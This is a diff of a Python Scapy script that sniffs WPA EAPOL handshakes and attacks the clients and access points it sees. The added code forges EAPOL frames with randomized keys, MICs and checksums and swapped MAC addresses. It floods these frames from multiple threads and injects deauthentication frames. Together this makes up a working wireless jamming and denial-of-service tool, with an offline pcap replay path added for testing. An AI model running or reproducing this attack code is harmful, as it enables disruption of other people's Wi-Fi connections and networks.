@@ -19,11 +19,18 @@ MIC_3 = b'\xc6\xb4\x24\x6f\x63\x58\x84\x48\x99\xff\xe2\x09\x11\x72\x61\x55'
 conf.iface = "wlan0" # !!!!!!!!!!!!!!!!!!!!!!!! EDIT
 
 
-eapol_count = 10
+eapol_count = 111
 
-pkt_buffer = [False,False,False,False,False]
+thread_count = 9 # !!!!!! NOT <1
 
 except_mac = []
+
+pkt_thread = []
+
+packet_buffer = {}
+
+for i in range(0,thread_count):
+	pkt_thread.append(False)
 
 
 def on_monitor():
@@ -32,26 +39,29 @@ def on_monitor():
 	print('Set monitor mode Succesfully')
 
 
-def deauth():
-	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+def deauth(target_mac,ap_mac):
+	pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
+	sendp(pkt,verbose=False)
 
 
-def modify_mac(pkt,ap_mac,target_mac):
+
+def modify_mac(pkt,arg1,arg2):
 	pkt = RadioTap(pkt)
-	pkt[Dot11].addr1 = ap_mac
-	pkt[Dot11].addr2 = ap_mac
-	pkt[Dot11].addr3 = target_mac
+	pkt[Dot11].addr1 = arg2
+	pkt[Dot11].addr2 = arg1
+	pkt[Dot11].addr3 = arg2
 
 	return bytes(pkt)
 
 
-def modify_bytes(pkt,arg1,arg2):
-	pkt = pkt.decode('iso-8859-1')
-	arg1 = arg1.decode('iso-8859-1')
-	arg2 = arg2.decode('iso-8859-1')
-	pkt = pkt.replace(arg1,arg2)
-	return pkt.encode('iso-8859-1')
+def modify_key(pkt,a,arg):
+	arg_num = 0
+	for i in range(a,a+len(arg)):
+		pkt = pkt[0:i] + arg[arg_num:arg_num+1] + pkt[i+1:len(pkt)]
+		arg_num = arg_num + 1
+	
+	return bytes(pkt)
+		
 
 
 def gen_key(n):
@@ -67,11 +77,7 @@ def gen_key(n):
 	return result
 
 
-def send_bytes():
-	pass
-
-
-def eapol_jamming():
+def gen_pkt(eapol,ap_mac,target_mac):
 
 	random_key_1 = gen_key(32)
 	random_key_2 = gen_key(32)
@@ -85,26 +91,83 @@ def eapol_jamming():
 	random_fcs_3 = gen_key(4)
 	random_fcs_4 = gen_key(4)
 
+	eapol_1 = eapol[0]
+	eapol_2 = eapol[1]
+	eapol_3 = eapol[2]
+	eapol_4 = eapol[3]
 
-	eapol_1 = eapol_sample_1
-	eapol_1 = modify_bytes(eapol_1,eapol_key_1,random_key_1)
+
+	eapol_1 = modify_mac(eapol_1,ap_mac,target_mac)
+	eapol_1 = modify_key(eapol_1,77,random_key_1)
 	eapol_1 = eapol_1 + random_fcs_1
 
-	eapol_2 = eapol_sample_2
-	eapol_2 = modify_bytes(eapol_2,eapol_key_2,random_key_2)
-	eapol_2 = modify_bytes(eapol_2,MIC_1,random_mic_1)
+	eapol_2 = modify_mac(eapol_2,target_mac,ap_mac)
+	eapol_2 = modify_key(eapol_2,77,random_key_2)
+	eapol_2 = modify_key(eapol_2,141,random_mic_1)
 	eapol_2 = eapol_2 + random_fcs_2
 
-	eapol_3 = eapol_sample_3
-	eapol_3 = modify_bytes(eapol_3,eapol_key_1,random_key_1)
-	eapol_3 = modify_bytes(eapol_3,MIC_2,random_mic_2)
+	eapol_3 = modify_mac(eapol_3,ap_mac,target_mac)
+	eapol_3 = modify_key(eapol_3,77,random_key_1)
+	eapol_3 = modify_key(eapol_3,141,random_mic_2)
 	eapol_3 = eapol_3 + random_fcs_3
 
-	eapol_4 = eapol_sample_4
-	eapol_4 = modify_bytes(eapol_4,MIC_3,random_mic_3)
+	eapol_4 = modify_mac(eapol_4,target_mac,ap_mac)
+	eapol_4 = modify_key(eapol_4,141,random_mic_3)
 	eapol_4 = eapol_4 + random_fcs_4
 
 	return [eapol_1,eapol_2,eapol_3,eapol_4]
+
+
+def check_eap_num(pkt):
+	pkt = bytes(pkt)
+	eap_type = format(pkt[66],'x')
+	eap_nonce = format(pkt[4*16+13],'x')
+	if eap_type == '8a':
+		return 1
+	elif eap_type == 'ca':
+		return 3
+	else:
+		if eap_nonce == '0':
+			return 4
+		else:
+			return 2
+
+
+def eapol_jamming(eapol,replay,deauth_num,num,ap_mac,target_mac):
+
+	if deauth_num[0] - 1 == num:
+		deauth_num = deauth_num[1]
+	else:
+		deauth_num = -1
+	
+	for i in range(0,replay):
+		if i == deauth_num:
+			deauth(ap_mac,target_mac)
+		pkt = gen_pkt(eapol,ap_mac,target_mac)
+		for X in pkt:
+			sendp(X,verbose=False)
+		
+
+def thread_eapol_jamming(eapol,deauth_num,ap_mac,target_mac):
+	tm_per = eapol_count // thread_count
+	tm_extra = eapol_count % thread_count
+
+	multi_thread_eapol_jamming = []
+
+	deauth_num = [deauth_num//thread_count,deauth_num%thread_count]
+	
+	
+	for i in range(0,thread_count):
+		replay = tm_per
+		if i < tm_extra:
+			replay = replay + 1
+		multi_thread_eapol_jamming.append(threading.Thread(target=eapol_jamming, args=(eapol,replay,deauth_num,i,ap_mac,target_mac)))
+		multi_thread_eapol_jamming[i].daemon = True
+		multi_thread_eapol_jamming[i].start()
+
+	for i in range(0,thread_count):
+		multi_thread_eapol_jamming[i].join()
+		print(f'No. {i} thread quit')
 
 
 thread_handler = []
@@ -112,46 +175,48 @@ online_thread_num = []
 online_thread_last_num = -1
 
 
-def mult_thread_handler(pkt,thread_num):
-	global pkt_buffer, except_mac, online_thread_num
+def multi_thread_handler(thread_num,ap_mac,target_mac):
+	global except_mac, online_thread_num, pkt_buffer
 
-	ap_mac = pkt[Dot11].addr1
-	target_mac = pkt[Dot11].addr3
+	eapol = [False,False,False,False]
+	
+	time.sleep(0.5)
 
-	while(True):
-		buffer_num = -1
-		for i in range(0,5):
-			if pkt_buffer[i] != False:
-				buffer_num = i
-				break
-		if buffer_num == -1:
-			time.sleep(1)
-		else:
-			break
+	for pkt in packet_buffer[f'{ap_mac}/{target_mac}']:
+		eap_num = check_eap_num(pkt)-1
+		eapol[eap_num] = pkt
+
+	for i in range(0,4):
+		if not eapol[i]:
+			eapol[i] = eval(f'eapol_sample_{i+1}')
 	
-	for i in pkt_buffer[buffer_num]:
-		for X in i:
-			print(X)
-			X = RadioTap(X)
-			print(X)
-			X[Dot11].addr1 = ap_mac
-			X[Dot11].addr2 = ap_mac
-			X[Dot11].addr3 = target_mac
-			sendp(pkt)
-	
-	pkt_buffer[buffer_num] = False	
+
+	deauth_num = random.randint(int(eapol_count*0.2),int(eapol_count*0.8))
+
+	thread_eapol_jamming(eapol,deauth_num,ap_mac,target_mac)
+
 	online_thread_num.remove(thread_num)
 	except_mac.remove(f'{ap_mac}/{target_mac}')
+	del packet_buffer[f'{ap_mac}/{target_mac}']
 	
+
 
 def handler(pkt):
 	global except_mac, online_thread_last_num, online_thread_num,thread_handler
-
-	ap_mac = pkt[Dot11].addr1
-	target_mac = pkt[Dot11].addr3
 	
+	eap_num = check_eap_num(pkt)
+	
+	if eap_num == 1 or eap_num == 3:
+		ap_mac = pkt[Dot11].addr2
+		target_mac = pkt[Dot11].addr1
+	else:
+		ap_mac = pkt[Dot11].addr1
+		target_mac = pkt[Dot11].addr2
+
+
 	if not f'{ap_mac}/{target_mac}' in except_mac:
 		except_mac.append(f'{ap_mac}/{target_mac}')
+		packet_buffer[f'{ap_mac}/{target_mac}'] = [bytes(pkt)]
 		
 		thread_num = 0
 		while(True):
@@ -163,46 +228,30 @@ def handler(pkt):
 		if thread_num > online_thread_last_num:
 			online_thread_last_num = thread_num
 
-			thread_handler.append(threading.Thread(target=mult_thread_handler, args=(pkt,thread_num)))
+			thread_handler.append(threading.Thread(target=multi_thread_handler, args=(thread_num,ap_mac,target_mac)))
 		else:
-			thread_handler[thread_num] = threading.Thread(target=mult_thread_handler, args=(pkt,thread_num))
+			thread_handler[thread_num] = threading.Thread(target=multi_thread_handler, args=(thread_num,ap_mac,target_mac))
 	
 		online_thread_num.append(thread_num)
-		thread_handler[thread_num].daemon = True
+		thread_handler[thread_num].daemon = False
 		thread_handler[thread_num].start()
+	
+	packet_buffer[f'{ap_mac}/{target_mac}'].append(bytes(pkt))
 
 
 def search_connection():
 	sniff(prn=handler, filter='ether proto 0x888e', monitor=True)
 
 
-def gen_pkt():
-	global pkt_buffer
-	if False in pkt_buffer:
-		for i in range(0,5):
-			if pkt_buffer[i] == False:
-				pkt_buffer[i] = [eapol_jamming()]
-				for ii in range(0,eapol_count-1):
-					pkt_buffer[i].append(eapol_jamming())
-				print(f'Buffer {i} is Set')
-			
-	else:
-		time.sleep(1)
-
+def search_test():
+	sniff(offline='eap.pcapng',filter='ether proto 0x888e', prn=handler)
 
 
 def start():
-	on_monitor()
-	thread_gen_pkt = threading.Thread(target=gen_pkt)
-	thread_gen_pkt.daemon = True
-	thread_gen_pkt.start()
+	#on_monitor()
 	thread_search = threading.Thread(target=search_connection)
 	thread_search.daemon = True
 	thread_search.start()
-	thread_gen_pkt.join()
 	thread_search.join()
 
-
-start()
-
-
+search_test()
